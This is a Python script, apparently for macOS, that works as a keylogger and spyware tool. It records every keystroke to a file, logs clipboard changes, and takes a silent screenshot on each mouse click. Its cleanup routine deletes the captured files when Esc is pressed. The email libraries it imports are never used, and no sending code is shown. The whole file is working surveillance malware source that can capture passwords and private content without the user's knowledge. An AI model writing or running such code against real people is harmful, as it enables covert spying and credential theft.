from time import sleep
from pynput import keyboard, mouse
from richxerox import *
import os
import smtplib
from email.message import EmailMessage
import subprocess
import shutil

log_file = open("log.txt", "w")
clipboard_file = open("clipboard.txt", "w")

def on_press(key):
    try:
        if key == keyboard.Key.space:
            log_file.write(" ")
        elif key == keyboard.Key.backspace:
            log_file.seek(0, os.SEEK_END) # Move the cursor to the end of the log_file
            pos = log_file.tell() # Get the current position of the cursor
            if pos > 0:
                log_file.seek(pos - 1)
                log_file.truncate() # Delete the last character
        elif key == keyboard.Key.esc:
            pass
        else:
            log_file.write(key.char)
    except AttributeError:
        log_file.write("[" + str(key) + "]")
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
def take_screenshot():
    global count
    filename = f'sc{str(count)}.png'
    outfile = os.path.join(folder, filename)
    count += 1
    outcmd = "{} {} {}".format('screencapture', '-x', outfile)
    try:
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Error: [%d]\n{}\n'.format(e.returncode, e.output))

def on_click(x, y, button, pressed):
    if pressed:
        take_screenshot()
        
def cleanup():
    listener2.stop()
    log_file.close()
    clipboard_file.close()
    shutil.rmtree(folder)
    os.remove("log.txt")
    os.remove("clipboard.txt")
        
folder = os.path.join(os.getcwd(), 'screenshot_folder')
if os.path.isdir(folder) == False:
    os.mkdir(folder)
    
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener2 = mouse.Listener(on_click=on_click)
listener.start()
listener2.start()
        
text = None
count = 0
while (listener.is_alive()):
    sleep(1)
    if (text == paste(format='text')):
        continue
    text = paste(format='text')
    clipboard_file.write(text+"\n")
cleanup()